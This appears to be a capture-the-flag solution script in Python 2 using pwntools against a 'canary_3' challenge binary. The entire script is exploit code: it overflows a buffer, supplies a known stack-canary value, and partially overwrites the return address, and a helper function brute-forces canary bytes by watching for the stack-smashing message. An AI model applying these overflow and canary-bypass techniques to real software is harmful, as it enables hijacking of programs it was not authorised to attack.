from pwn import *

con = process('/problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328/vuln')

con.recvregex('> ')
con.sendline('54')
con.recvregex('Input> ')

payload = 'A' * 32
payload += '57Gh'
payload += 'A' * 16
payload += '\xee\x47'
con.sendline(payload)

print con.recvall()


def leak():
    for c in range(32, 122):
        con = process('/problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328/vuln')

        con.recvregex('> ')
        con.sendline('36')
        con.recvregex('Input> ')

        payload = 'A' * 32
        payload += '57Gh'
        # payload += chr(c)
        con.sendline(payload)

        if con.recvline().strip() != '*** Stack Smashing Detected *** : Canary Value Corrupt!':
            print '%c(%d)' % (chr(c), c)
        con.close()
